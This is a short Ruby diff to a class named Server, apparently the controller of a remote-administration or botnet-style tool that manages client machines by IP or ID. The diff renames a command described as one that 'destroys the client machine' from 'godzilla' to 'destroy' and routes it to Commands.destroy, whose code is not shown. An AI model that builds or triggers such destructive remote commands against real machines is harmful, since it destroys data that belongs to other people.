@@ -42,7 +42,7 @@ class Server
     t << :separator
     t << ['reboot IP', 'reboots the client']
     t << :separator
-    t << ['godzilla IP', 'destroys the client machine']
+    t << ['destroy IP', 'destroys the client machine']
     t << :separator
     t << ['help', 'shows the HELP menu']
     t << :separator
@@ -145,10 +145,10 @@ class Server
           else
             puts 'invalid IP or ID'
           end
-        when 'godzilla'
+        when 'destroy'
           client = find_client ip
           if client
-            Commands.godzilla client
+            Commands.destroy client
           else
             puts 'invalid IP or ID'
           end
